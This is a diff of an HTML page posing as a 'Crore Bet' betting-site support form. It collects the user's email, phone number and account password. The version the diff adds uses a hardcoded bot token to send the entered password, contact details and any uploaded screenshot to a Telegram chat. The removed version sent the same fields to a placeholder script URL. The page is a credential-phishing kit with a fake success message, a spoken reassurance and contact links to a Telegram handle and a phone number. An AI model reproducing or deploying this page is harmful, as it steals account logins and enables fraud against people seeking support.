@@ -1,385 +1,607 @@
-<style>
-/* 1. Blogger Default Elements Hide */
-#navbar-iframe, .header-widget, .Header, .title-wrapper, .mobile-header, header,
-.date-header, .date-outer, .post-title, .post-header, .post-share-buttons, 
-.post-labels, .comments, #comments, .mobile-top, .search, .mobile-search, .blog-pager,
-.bg-photo, .bg-photo-overlay, .body-bg, .body-background {
-    display: none !important;
-}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crore Bet Support</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
 
-/* 2. Remove Blogger Page Margin & Scroll */
-html, body {
-    margin: 0 !important;
-    padding: 0 !important;
-    overflow: hidden !important;
-    background: #0c0a17 !important;
-}
+        /* --- PRELOADER OVERLAY STYLING --- */
+        #cb-preloader {
+            position: fixed;
+            inset: 0;
+            background-color: #050505;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 999999;
+            transition: opacity 0.45s ease, visibility 0.45s ease;
+        }
 
-/* 3. Full-Screen Fixed Overlay (Har Theme Ke Upar Rahega) */
-.fixed-support-wrapper {
-    position: fixed !important;
-    top: 0 !important;
-    left: 0 !important;
-    width: 100vw !important;
-    height: 100vh !important;
-    height: 100dvh !important;
-    background: radial-gradient(circle at 50% 0%, #1e1338 0%, #0c0a17 65%, #05040a 100%) !important;
-    z-index: 99999999 !important;
-    overflow-y: auto !important;
-    -webkit-overflow-scrolling: touch !important;
-    display: flex !important;
-    flex-direction: column !important;
-    align-items: center !important;
-    padding: 40px 16px 80px 16px !important;
-    box-sizing: border-box !important;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
-}
+        #cb-preloader.cb-hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
 
-/* STARK BET / CRORE BET BADGE LOGO */
-.logo-container {
-    margin-bottom: 25px;
-    text-align: center;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
+        .cb-loader-box {
+            position: relative;
+            width: 125px;
+            height: 125px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-.crorebet-pill-badge {
-    background-color: #000000;
-    display: inline-flex;
-    align-items: center;
-    padding: 8px 16px 8px 22px;
-    border-radius: 12px;
-    gap: 12px;
-    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.7);
-    border: 1px solid rgba(255, 255, 255, 0.08);
-}
+        /* Moti Yellow Circular Ring */
+        .cb-spinner-ring {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 6px solid #1e1e1e;
+            border-top-color: #fff230;
+            border-right-color: #fff230;
+            animation: cbSpin 0.9s linear infinite;
+        }
 
-.crore-text {
-    color: #ffffff;
-    font-size: 32px;
-    font-weight: 900;
-    letter-spacing: 1px;
-    font-family: 'Arial Black', Impact, sans-serif;
-    text-transform: uppercase;
-}
+        .cb-logo-text {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 14px;
+            font-weight: 900;
+            letter-spacing: 0.5px;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            z-index: 2;
+        }
 
-.bet-yellow-box {
-    background-color: #fff01f;
-    color: #000000;
-    font-size: 26px;
-    font-weight: 900;
-    padding: 3px 12px;
-    border-radius: 7px;
-    font-family: 'Arial Black', Impact, sans-serif;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-}
+        /* Bright Yellow BET Badge */
+        .cb-logo-badge {
+            background-color: #fff230;
+            color: #000000;
+            padding: 2px 5px;
+            border-radius: 4px;
+            font-weight: 900;
+        }
 
-/* Glassmorphism Form Card */
-.form-card { 
-    width: 100%; 
-    max-width: 460px; 
-    box-sizing: border-box;
-    background: rgba(22, 18, 38, 0.88);
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    border-radius: 22px;
-    padding: 26px 20px;
-    box-shadow: 0 20px 45px rgba(0, 0, 0, 0.6);
-}
+        @keyframes cbSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-.card-title {
-    text-align: center;
-    color: #ffffff;
-    font-size: 19px;
-    font-weight: 700;
-    margin-bottom: 20px;
-}
+        /* --- MAIN PAGE STYLING --- */
+        body {
+            background-color: #f4f6f9;
+            color: #1a1a1a;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px 14px 40px;
+        }
 
-.card-title span {
-    color: #fff01f;
-}
+        .form-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            padding: 22px 18px;
+            border-radius: 18px;
+            border: 1px solid #e2e8f0;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+        }
 
-.input-group { 
-    margin-bottom: 16px; 
-}
+        .logo-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 16px;
+        }
 
-.input-group label { 
-    display: block;
-    margin-bottom: 7px; 
-    font-size: 13px; 
-    color: #a5a1bb; 
-    font-weight: 600; 
-}
+        .crore-bet-logo {
+            background-color: #000000;
+            display: inline-flex;
+            align-items: center;
+            padding: 7px 16px;
+            border-radius: 8px;
+            border: 1px solid #000000;
+        }
 
-.input-group input, .input-group select {
-    width: 100%; 
-    padding: 14px 15px; 
-    border: 1px solid rgba(255, 255, 255, 0.1); 
-    border-radius: 12px; 
-    background: #0f0c1c; 
-    color: #ffffff; 
-    font-size: 15px; 
-    outline: none; 
-    box-sizing: border-box;
-}
+        .crore-text {
+            color: #ffffff;
+            font-size: 21px;
+            font-weight: 900;
+            letter-spacing: 1.5px;
+            margin-right: 8px;
+        }
 
-.input-group input:focus, .input-group select:focus {
-    border-color: #fff01f; 
-    box-shadow: 0 0 0 3px rgba(255, 240, 31, 0.18); 
-}
+        .bet-badge {
+            background-color: #fff230;
+            color: #000000;
+            font-size: 17px;
+            font-weight: 900;
+            padding: 3px 8px;
+            border-radius: 5px;
+        }
 
-.input-group select {
-    cursor: pointer;
-}
+        .live-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 8px;
+        }
 
-.input-group select option {
-    background-color: #0f0c1c;
-    color: #ffffff;
-}
+        .blinking-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #10b981;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #10b981;
+            animation: blinkLive 1.2s infinite ease-in-out;
+        }
 
-.input-group input[type="file"] { 
-    padding: 10px; 
-    cursor: pointer; 
-    color: #a5a1bb; 
-    font-size: 13px;
-}
+        @keyframes blinkLive {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.25; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
 
-.input-group input[type="file"]::-webkit-file-upload-button {
-    background: rgba(255, 255, 255, 0.08); 
-    color: #ffffff; 
-    border: 1px solid rgba(255, 255, 255, 0.15); 
-    padding: 8px 14px;
-    border-radius: 8px; 
-    margin-right: 12px; 
-    font-weight: 600; 
-    cursor: pointer;
-}
+        .support-subtext {
+            font-size: 13px;
+            color: #0f172a;
+            font-weight: 800;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
 
-.row { display: flex; flex-direction: column; }
-.row .input-group { margin-bottom: 16px; }
+        .input-group {
+            margin-bottom: 13px;
+            text-align: left;
+        }
 
-@media (min-width: 480px) {
-    .row { flex-direction: row; gap: 12px; }
-    .row .input-group { flex: 1; margin-bottom: 16px; }
-}
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: #334155;
+            font-weight: 700;
+        }
 
-/* Submit Button */
-.btn-submit {
-    width: 100%; 
-    display: block; 
-    margin-top: 10px; 
-    padding: 16px;
-    background: #fff01f; 
-    color: #000000; 
-    border: none; 
-    border-radius: 14px;
-    font-size: 16px; 
-    font-weight: 900; 
-    cursor: pointer; 
-    box-shadow: 0 8px 25px rgba(255, 240, 31, 0.25);
-    text-transform: uppercase;
-}
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"],
+        select {
+            width: 100%;
+            padding: 12px 14px;
+            background-color: #f8fafc;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 10px;
+            font-size: 15px;
+            color: #0f172a;
+            outline: none;
+            transition: border-color 0.2s;
+        }
 
-.btn-submit:hover { 
-    filter: brightness(1.05);
-}
+        input::placeholder {
+            color: #94a3b8;
+            font-size: 14px;
+        }
 
-/* Telegram Link */
-.tg-link-container { 
-    text-align: center; 
-    margin-top: 22px; 
-    padding-top: 16px; 
-    border-top: 1px solid rgba(255, 255, 255, 0.08); 
-}
+        input:focus,
+        select:focus {
+            border-color: #0088cc;
+            background-color: #ffffff;
+        }
 
-.tg-link-container p { 
-    color: #8c88a6; 
-    font-size: 13px; 
-    margin-bottom: 10px; 
-}
+        input[type="file"] {
+            width: 100%;
+            background-color: #f8fafc;
+            border: 1.5px dashed #cbd5e1;
+            border-radius: 10px;
+            padding: 10px;
+            font-size: 13px;
+            color: #475569;
+            outline: none;
+            cursor: pointer;
+        }
 
-.tg-btn {
-    display: inline-flex; 
-    align-items: center; 
-    justify-content: center; 
-    gap: 8px;
-    background: rgba(42, 171, 238, 0.12);
-    border: 1px solid rgba(42, 171, 238, 0.3);
-    color: #55c0ff; 
-    text-decoration: none; 
-    padding: 11px 22px;
-    border-radius: 50px; 
-    font-weight: 700; 
-    font-size: 13px;
-}
+        button.submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #fff230;
+            color: #000000;
+            border: 1px solid #eab308;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            margin-top: 14px;
+            box-shadow: 0 4px 12px rgba(255, 242, 48, 0.35);
+            transition: transform 0.15s ease;
+        }
 
-.tg-btn svg { width: 18px; height: 18px; fill: currentColor; }
+        button.submit-btn:active {
+            transform: scale(0.98);
+        }
 
-/* Status Modal */
-.modal-overlay {
-    display: none; 
-    position: fixed; 
-    top: 0; left: 0; right: 0; bottom: 0;
-    background: rgba(0, 0, 0, 0.85); 
-    z-index: 999999999 !important; 
-    justify-content: center; 
-    align-items: center; 
-    padding: 20px;
-}
+        button.submit-btn:disabled {
+            background-color: #e2e8f0;
+            color: #94a3b8;
+            border-color: #cbd5e1;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
 
-.modal-box {
-    background: #151124; 
-    padding: 30px 24px; 
-    border-radius: 20px; 
-    text-align: center; 
-    border: 1px solid rgba(255, 255, 255, 0.1); 
-    max-width: 320px; 
-    width: 100%;
-}
+        .telegram-section {
+            width: 100%;
+            max-width: 420px;
+            margin-top: 35px;
+            text-align: center;
+        }
 
-.icon-circle { 
-    width: 60px; 
-    height: 60px; 
-    border-radius: 50%; 
-    display: flex; 
-    align-items: center; 
-    justify-content: center; 
-    margin: 0 auto 14px auto; 
-    background: rgba(34, 197, 94, 0.12); 
-    border: 2px solid #22c55e; 
-    color: #22c55e; 
-}
+        .telegram-text {
+            font-size: 13px;
+            color: #64748b;
+            margin-bottom: 10px;
+        }
 
-.icon-circle svg { width: 30px; height: 30px; stroke-width: 2.5; }
-.modal-box h3 { color: #ffffff; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
-.modal-box p { font-size: 14px; color: #9d99b5; margin-bottom: 20px; }
+        .telegram-btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background-color: #0088cc;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 800;
+            box-sizing: border-box;
+            box-shadow: 0 4px 12px rgba(0, 136, 204, 0.25);
+        }
 
-.btn-close { 
-    background: #fff01f; 
-    color: #000000; 
-    border: none; 
-    padding: 12px 36px; 
-    border-radius: 50px; 
-    font-size: 14px; 
-    font-weight: 800; 
-    cursor: pointer; 
-}
-</style>
+        /* --- POPUP MODAL STYLING --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.65);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+            backdrop-filter: blur(4px);
+        }
 
-<div class="fixed-support-wrapper">
-    <!-- CRORE BET BADGE LOGO -->
-    <div class="logo-container">
-        <div class="crorebet-pill-badge">
-            <span class="crore-text">CRORE</span>
-            <span class="bet-yellow-box">BET</span>
+        .modal-box {
+            background-color: #ffffff;
+            border: 2px solid #10b981;
+            border-radius: 18px;
+            max-width: 340px;
+            width: 100%;
+            padding: 24px 20px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            animation: popAnim 0.25s ease-out;
+        }
+
+        @keyframes popAnim {
+            0% { transform: scale(0.85); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-icon {
+            font-size: 42px;
+            color: #10b981;
+            margin-bottom: 10px;
+            line-height: 1;
+        }
+
+        .modal-title {
+            font-size: 19px;
+            font-weight: 800;
+            color: #0f172a;
+            margin-bottom: 8px;
+        }
+
+        .modal-desc {
+            font-size: 13.5px;
+            color: #475569;
+            line-height: 1.5;
+            margin-bottom: 18px;
+        }
+
+        .modal-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .modal-ok-btn {
+            background-color: #000000;
+            color: #ffffff;
+            border: none;
+            padding: 10px 32px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .modal-tg-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background-color: #0088cc;
+            color: #ffffff;
+            text-decoration: none;
+            padding: 10px 16px;
+            border-radius: 8px;
+            font-size: 13.5px;
+            font-weight: 700;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .modal-tg-btn svg,
+        .modal-call-btn svg {
+            width: 16px;
+            height: 16px;
+            fill: #ffffff;
+        }
+
+        /* Calling Button Styling */
+        .modal-call-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background-color: #10b981;
+            color: #ffffff;
+            text-decoration: none;
+            padding: 10px 16px;
+            border-radius: 8px;
+            font-size: 13.5px;
+            font-weight: 700;
+            width: 100%;
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Preloader Screen -->
+    <div id="cb-preloader">
+        <div class="cb-loader-box">
+            <div class="cb-spinner-ring"></div>
+            <div class="cb-logo-text">
+                <span>CRORE</span>
+                <span class="cb-logo-badge">BET</span>
+            </div>
         </div>
     </div>
-    
+
+    <!-- Main Card Box -->
     <div class="form-card">
-        <div class="card-title">Priority <span>Support</span> Desk</div>
+        <div class="logo-wrapper">
+            <div class="crore-bet-logo">
+                <span class="crore-text">CRORE</span>
+                <span class="bet-badge">BET</span>
+            </div>
+            <div class="live-status">
+                <span class="blinking-dot"></span>
+                <span class="support-subtext">24/7 Live Support</span>
+            </div>
+        </div>
 
         <form id="supportForm">
+            <!-- 1. Email -->
             <div class="input-group">
-                <label for="email">User Email</label>
-                <input type="email" id="email" placeholder="example@gmail.com" required>
+                <label for="email">Email</label>
+                <input type="email" id="email" placeholder="Enter your email" required>
             </div>
 
-            <div class="row">
-                <div class="input-group">
-                    <label for="phone">Phone Number</label>
-                    <input type="tel" id="phone" placeholder="10 Digit Number" pattern="[0-9]{10}" required>
-                </div>
-                <div class="input-group">
-                    <label for="password">Password</label>
-                    <input type="text" id="password" placeholder="Account Password" required>
-                </div>
+            <!-- 2. Name -->
+            <div class="input-group">
+                <label for="name">Name</label>
+                <input type="text" id="name" placeholder="Enter your name" required>
             </div>
 
+            <!-- 3. Phone Number -->
             <div class="input-group">
-                <label for="problem">Select Query Type</label>
-                <select id="problem" required>
-                    <option value="" disabled selected>Choose your issue...</option>
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" placeholder="Enter phone number" required>
+            </div>
+
+            <!-- 4. User ID -->
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="text" id="password" placeholder="Enter your Password" required>
+            </div>
+
+            <!-- 5. Problem Issue Dropdown -->
+            <div class="input-group">
+                <label for="problemIssue">Problem Issue</label>
+                <select id="problemIssue" required>
+                    <option value="" disabled selected>Select an issue...</option>
+                    <option value="Email Confirm">Email Confirm</option>
+                    <option value="Number Confirm">Number Confirm</option>
+                    <option value="Profile Update">Profile Update</option>
                     <option value="Withdrawal Problem">Withdrawal Problem</option>
                     <option value="Deposit Problem">Deposit Problem</option>
-                    <option value="Profile Update">Profile Update</option>
                     <option value="Bonus Issue">Bonus Issue</option>
-                    <option value="Email Verify">Email Verify</option>
                 </select>
             </div>
 
+            <!-- 6. Screenshot Upload -->
             <div class="input-group">
-                <label for="screenshot">Attach Screenshot (Optional)</label>
+                <label for="screenshot">Upload Screenshot (Optional)</label>
                 <input type="file" id="screenshot" accept="image/*">
             </div>
 
-            <button type="submit" class="btn-submit" id="submitBtn">Submit Request</button>
+            <!-- Submit Button -->
+            <button type="submit" id="submitBtn" class="submit-btn">Submit Request</button>
         </form>
+    </div>
 
-        <div class="tg-link-container">
-            <p>Need urgent assistance?</p>
-            <a href="https://t.me/AapkaTelegramUsername" target="_blank" class="tg-btn">
-                <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.211-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.023c.242-.213-.054-.333-.373-.121l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.458c.538-.196 1.006.128.832.941z"/></svg>
-                Contact via Telegram
-            </a>
+    <!-- Telegram Section -->
+    <div class="telegram-section">
+        <p class="telegram-text">Need immediate help? Contact our direct support</p>
+        <a href="https://t.me/helpcare247" target="_blank" class="telegram-btn">Chat on Telegram</a>
+    </div>
+
+    <!-- Success Modal Popup -->
+    <div class="modal-overlay" id="successModal">
+        <div class="modal-box">
+            <div class="modal-icon">✓</div>
+            <h3 class="modal-title">Request Submitted!</h3>
+            <p class="modal-desc">Aapki request support team ko bhej di gayi hai. Kripya <b>15 se 20 minute</b> ka wait karein, humari team jald hi issue solve karegi.</p>
+            
+            <div class="modal-actions">
+                <!-- Telegram Button -->
+                <a href="https://t.me/helpcare247" target="_blank" class="modal-tg-btn">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/>
+                    </svg>
+                    Contact on Telegram
+                </a>
+
+                <!-- Calling Button -->
+                <a href="tel:+917014269031" class="modal-call-btn">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.58.57a1 1 0 011 1V20a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1c0 1.25.2 2.46.57 3.58a1 1 0 01-.25 1.01l-2.2 2.2z"/>
+                    </svg>
+                    Call Support
+                </a>
+
+                <button type="button" class="modal-ok-btn" id="closeModalBtn">OK</button>
+            </div>
         </div>
     </div>
-</div>
 
-<div id="statusModal" class="modal-overlay">
-    <div class="modal-box">
-        <div id="modalIcon" class="icon-circle">
-            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
-            </svg>
-        </div>
-        <h3 id="modalTitle">Request Sent!</h3>
-        <p id="statusText">Aap ka request team ko bhej diya gya hai.</p>
-        <button class="btn-close" id="closeModalBtn">Continue</button>
-    </div>
-</div>
+    <script>
+        // ==========================================
+        // YAHAN APNA BOT TOKEN AUR CHAT ID DALEIN
+        // ==========================================
+        const BOT_TOKEN = "9157522398:AAH24Y64DBqUyi-Tsgwgcz20iXbaxUzqGRo";
+        const CHAT_ID = "7643342967";
 
-<script>
-    // 👇 Yahan apna Google Apps Script Web App URL dalein 👇
-    const GOOGLE_SCRIPT_URL = "APNA_DEPLOYED_WEB_APP_URL_YAHAN_DALEIN";
-
-    const form = document.getElementById('supportForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const statusModal = document.getElementById('statusModal');
-    const closeModalBtn = document.getElementById('closeModalBtn');
-
-    closeModalBtn.addEventListener('click', () => { statusModal.style.display = 'none'; });
-
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        submitBtn.innerText = "Processing...";
-        submitBtn.disabled = true;
-
-        const email = encodeURIComponent(document.getElementById('email').value.trim());
-        const phone = encodeURIComponent(document.getElementById('phone').value.trim());
-        const password = encodeURIComponent(document.getElementById('password').value.trim());
-        const problem = encodeURIComponent(document.getElementById('problem').value);
-
-        const finalUrl = `${GOOGLE_SCRIPT_URL}?email=${email}&phone=${phone}&password=${password}&problem=${problem}`;
-
-        fetch(finalUrl, {
-            method: 'GET',
-            mode: 'no-cors'
-        })
-        .then(() => {
-            statusModal.style.display = "flex";
-            form.reset();
-        })
-        .catch(() => {
-            statusModal.style.display = "flex";
-        })
-        .finally(() => {
-            submitBtn.innerText = "Submit Request";
-            submitBtn.disabled = false;
+        // Preloader Animation Script (2 Seconds)
+        window.addEventListener("load", function () {
+            const loader = document.getElementById("cb-preloader");
+            setTimeout(function () {
+                loader.classList.add("cb-hidden");
+            }, 2000);
         });
-    });
-</script>
+
+        // Form & Modal Script
+        const form = document.getElementById('supportForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const modal = document.getElementById('successModal');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+
+        closeModalBtn.addEventListener('click', function() {
+            modal.style.display = 'none';
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+            }
+        });
+
+        function speakWaitMessage() {
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+                const message = "Aapki request support team ko bhej di gayi hai. Kripya pandrah se bees minute ka wait karein, humari support team jald hi aapki sahayata karegi.";
+                const speech = new SpeechSynthesisUtterance(message);
+                speech.lang = 'hi-IN';
+                speech.rate = 0.95;
+                speech.pitch = 1.0;
+                window.speechSynthesis.speak(speech);
+            }
+        }
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Submitting...";
+
+            const email = document.getElementById('email').value;
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const problemIssue = document.getElementById('problemIssue').value;
+            const fileInput = document.getElementById('screenshot');
+            const file = fileInput.files[0];
+
+            const captionText = "📌 *New Support Request (Crore Bet)*\n\n" +
+                                "📧 *Email:* " + email + "\n" +
+                                "👤 *Name:* " + name + "\n" +
+                                "📞 *Phone:* " + phone + "\n" +
+                                "🆔 *Password:* " + password + "\n" +
+                                "⚠️ *Problem Issue:* " + problemIssue;
+
+            if (file) {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", file);
+                formData.append("caption", captionText);
+                formData.append("parse_mode", "Markdown");
+
+                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
+                    method: "POST",
+                    body: formData
+                })
+                .then(function(res) { return res.json(); })
+                .then(handleResponse)
+                .catch(handleError);
+            } else {
+                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: captionText,
+                        parse_mode: "Markdown"
+                    })
+                })
+                .then(function(res) { return res.json(); })
+                .then(handleResponse)
+                .catch(handleError);
+            }
+
+            function handleResponse(data) {
+                if (data.ok) {
+                    modal.style.display = 'flex';
+                    speakWaitMessage();
+                    form.reset();
+                } else {
+                    alert("Telegram Error: Kripya apna Bot Token aur Chat ID check karein.");
+                }
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Submit Request";
+            }
+
+            function handleError() {
+                alert("Network error! Please try again.");
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Submit Request";
+            }
+        });
+    </script>
+
+</body>
+</html>
